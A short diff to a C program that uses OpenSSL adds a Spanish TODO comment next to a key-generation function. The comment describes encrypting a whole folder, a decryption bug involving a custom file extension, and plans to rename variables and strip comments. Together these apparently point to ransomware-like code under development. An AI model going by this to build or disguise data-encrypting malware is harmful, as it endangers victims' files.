@@ -4,7 +4,12 @@
 #include <tchar.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
-
+/* TODO
+Se abre la carpeta y se encripta correctamente.
+A la hora de desencriptar ocurre un problema con ello. Si le ponemos una extensión personalizada no puede abrir el archivo y simplemente genera una copia en las carpetas (encriptadas).
+Si no le ponemos extensión parece que funciona pero se pierde la informacion original.
+Cuando terminemos tenemos que quitar los comentarios, renombrar variables y quitar los printf para aumentar la velocidad.
+*/
 void generateRandomKey(unsigned char *key, int keyLength) {
     RAND_bytes(key, keyLength);
 }
